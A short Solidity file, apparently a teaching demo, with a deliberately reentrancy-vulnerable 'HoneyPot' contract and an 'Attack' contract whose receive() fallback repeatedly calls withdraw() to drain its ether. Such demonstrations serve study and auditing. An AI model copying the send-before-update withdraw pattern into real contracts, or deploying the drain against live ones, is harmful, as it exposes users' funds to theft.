// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

contract HoneyPot {
    mapping(address => uint256) public balances;
    address private deployer;
    constructor() {
        deployer = msg.sender;
    }
    function isOwner(address user) external view returns (bool result) {
        if (user == deployer) {
            return true;
        } else {
            return false;
        }
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        address sender = msg.sender;
        balances[sender] = 0;
    }
}

contract Attack {
    HoneyPot public honeyPot;

    constructor(address _depositFundsAddress) {
        honeyPot = HoneyPot(_depositFundsAddress);
    }

    function attack() external payable {
        honeyPot.withdraw();
    }

    function deposit() external payable {
        require(msg.value >= 0.1 ether);
        honeyPot.deposit{value: 0.1 ether}();
    }

    receive() external payable {
        if (address(honeyPot).balance >= 0.1 ether) {
            honeyPot.withdraw();
        }
    }
}